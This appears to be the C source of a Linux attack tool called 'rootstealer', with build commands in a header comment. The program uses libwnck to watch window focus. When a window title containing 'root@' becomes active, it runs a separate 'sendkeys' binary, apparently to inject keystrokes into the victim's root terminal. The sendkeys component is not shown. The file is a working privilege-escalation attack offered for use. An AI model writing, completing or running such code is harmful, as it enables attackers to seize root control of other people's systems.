/*
$sudo apt-get install libwnck-dev
$ gcc -o roostealer rootstealer.c `pkg-config --cflags --libs libwnck-1.0` -DWNCK_I_KNOW_THIS_IS_UNSTABLE -DWNCK_COMPILATION
./rootstealer


*/
#include <libwnck/libwnck.h>
#include <stdlib.h>
#include <string.h>


static void detect_root_term (WnckScreen *screen, WnckWindow *previously_active_window, gpointer    data)
{
  WnckWindow *active_window;

  active_window = wnck_screen_get_active_window (screen);

  if (active_window)
  {
	char *title=(char *)wnck_window_get_name (active_window);
	if(strstr(title,"root@"))
	{
        	char cwd[1024];
		memset(cwd,0,1024);
        	getcwd(cwd, sizeof(cwd));
		char cmd[1048];
		memset(cmd,0,1048);
		snprintf(cmd,1048,"%s%s",cwd,"/sendkeys/bin/sendkeys");
		system(cmd); // external call because have dragons in libxtst
//if  you nd debug     		
//		g_print ("active: %s\n", title);
	}
  } 
}

int main (int argc, char **argv)
{
  GMainLoop *loop;
  WnckScreen *screen;

  gdk_init (&argc, &argv);

  loop = g_main_loop_new (NULL, FALSE);
  screen = wnck_screen_get_default ();

  g_signal_connect (screen, "active-window-changed", G_CALLBACK (detect_root_term), NULL);

  g_main_loop_run (loop);

  g_main_loop_unref (loop);

  return 0;
}
